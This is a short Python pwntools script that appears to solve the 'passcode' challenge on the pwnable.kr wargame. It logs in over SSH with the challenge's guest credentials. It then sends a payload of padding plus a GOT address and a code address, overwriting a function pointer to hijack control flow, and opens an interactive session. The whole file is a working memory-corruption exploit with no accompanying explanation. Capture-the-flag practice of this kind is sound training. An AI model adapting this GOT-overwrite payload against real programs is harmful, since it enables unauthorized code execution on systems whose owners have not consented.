from pwn import *

session = ssh(host='pwnable.kr', port=2222, user='passcode', password='guest')
io = session.process('passcode', env={"PS1":""})

# io = process("./pwnable.kr_passcode.assets/passcode")
# io = gdb.debug('pwnable.kr_passcode.assets/passcode', '''
# break welcome
# continue
# ''')

receive = io.recvline() # "Toddler's Secure Login System 1.0 beta.\n"
padding = b'A' * 96 + p32(0x0804A004) + str.encode(str(0x080485E3))
io.sendline(padding)

io.interactive()